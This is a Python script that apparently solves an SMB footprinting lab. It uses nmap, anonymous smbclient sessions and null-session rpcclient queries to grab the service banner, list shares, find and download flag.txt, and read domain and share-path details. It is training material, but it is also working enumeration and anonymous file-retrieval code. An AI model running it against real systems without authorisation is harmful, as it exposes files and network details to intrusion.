#!/usr/bin/env python3

import argparse
import os
import re
import subprocess
import tempfile
from dataclasses import dataclass
from typing import List, Optional, Tuple


@dataclass
class ShareInfo:
    name: str
    share_type: str
    comment: str


def run_cmd(command: List[str]) -> str:
    result = subprocess.run(command, capture_output=True, text=True, check=True)
    return result.stdout


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="SMB footprinting lab solver")
    parser.add_argument("host", help="Target IP or hostname")
    return parser.parse_args()


def get_smb_version_banner(host: str) -> str:
    output = run_cmd(["nmap", "-Pn", "-p139,445", "-sV", host])
    for line in output.splitlines():
        match = re.search(r"445/tcp\s+open\s+\S+\s+(.+)$", line)
        if match:
            return match.group(1).strip()
    raise RuntimeError("Could not parse SMB version banner from nmap output")


def list_shares(host: str) -> Tuple[List[ShareInfo], str]:
    output = run_cmd(["smbclient", "-N", "-L", f"//{host}"])
    shares: List[ShareInfo] = []

    for line in output.splitlines():
        match = re.match(r"\s*([\w$.-]+)\s+(Disk|IPC|Printer)\s+(.*)$", line)
        if match:
            shares.append(
                ShareInfo(
                    name=match.group(1).strip(),
                    share_type=match.group(2).strip(),
                    comment=match.group(3).strip(),
                )
            )

    if not shares:
        raise RuntimeError("No shares parsed from smbclient output")

    skip_names = {"IPC$", "ADMIN$", "C$", "print$", "PRINT$"}
    candidates = [s for s in shares if s.share_type == "Disk" and s.name not in skip_names]
    if not candidates:
        raise RuntimeError("No accessible non-default disk share found")

    return shares, candidates[0].name


def find_flag_in_share(host: str, share: str) -> str:
    output = run_cmd(["smbclient", "-N", f"//{host}/{share}", "-c", "recurse;ls"])
    current_dir = ""

    for raw_line in output.splitlines():
        line = raw_line.rstrip()

        if line.startswith("\\"):
            current_dir = line.strip("\\").strip()
            continue

        if re.search(r"\bflag\.txt\b", line, flags=re.IGNORECASE):
            filename = "flag.txt"
            if current_dir:
                return f"{current_dir}/{filename}"
            return filename

    raise RuntimeError("flag.txt not found in share listing")


def get_file_content(host: str, share: str, remote_path: str) -> str:
    remote_dir = os.path.dirname(remote_path).replace("/", "\\")
    remote_file = os.path.basename(remote_path)

    with tempfile.NamedTemporaryFile(prefix="smb_lab_flag_", delete=False) as temp_file:
        local_path = temp_file.name

    try:
        commands = []
        if remote_dir and remote_dir != ".":
            commands.append(f"cd {remote_dir}")
        commands.append(f"get {remote_file} {local_path}")
        run_cmd(["smbclient", "-N", f"//{host}/{share}", "-c", ";".join(commands)])

        with open(local_path, "r", encoding="utf-8", errors="replace") as f:
            return f.read().strip()
    finally:
        try:
            os.remove(local_path)
        except OSError:
            pass


def get_domain(host: str) -> str:
    output = run_cmd(["rpcclient", "-U", "", "-N", host, "-c", "querydominfo"])
    for line in output.splitlines():
        match = re.match(r"\s*Domain:\s*(.+)$", line)
        if match:
            return match.group(1).strip()
    raise RuntimeError("Could not parse domain from rpcclient querydominfo")


def get_share_details(host: str, share: str) -> Tuple[str, str]:
    output = run_cmd(["rpcclient", "-U", "", "-N", host, "-c", f"netsharegetinfo {share}"])
    remark = ""
    win_path = ""

    for line in output.splitlines():
        remark_match = re.match(r"\s*remark:\s*(.+)$", line)
        path_match = re.match(r"\s*path:\s*(.+)$", line)
        if remark_match:
            remark = remark_match.group(1).strip()
        if path_match:
            win_path = path_match.group(1).strip()

    if not remark or not win_path:
        raise RuntimeError("Could not parse share details from rpcclient output")

    unix_path = windows_path_to_unix(win_path)
    return remark, unix_path


def windows_path_to_unix(path: str) -> str:
    # Example: C:\home\sambauser\ -> /home/sambauser
    cleaned = path.strip().rstrip("\\")
    cleaned = re.sub(r"^[A-Za-z]:", "", cleaned)
    cleaned = cleaned.replace("\\", "/")
    if not cleaned.startswith("/"):
        cleaned = "/" + cleaned
    return cleaned


def main() -> int:
    args = parse_args()

    smb_banner = get_smb_version_banner(args.host)
    _, accessible_share = list_shares(args.host)
    flag_remote_path = find_flag_in_share(args.host, accessible_share)
    flag_value = get_file_content(args.host, accessible_share, flag_remote_path)
    domain = get_domain(args.host)
    share_customized_version, share_system_path = get_share_details(args.host, accessible_share)

    print(f"SMB banner: {smb_banner}")
    print(f"Accessible share: {accessible_share}")
    print(f"Flag path: {flag_remote_path}")
    print(f"Flag: {flag_value}")
    print(f"Domain: {domain}")
    print(f"Share custom version: {share_customized_version}")
    print(f"Share system path: {share_system_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())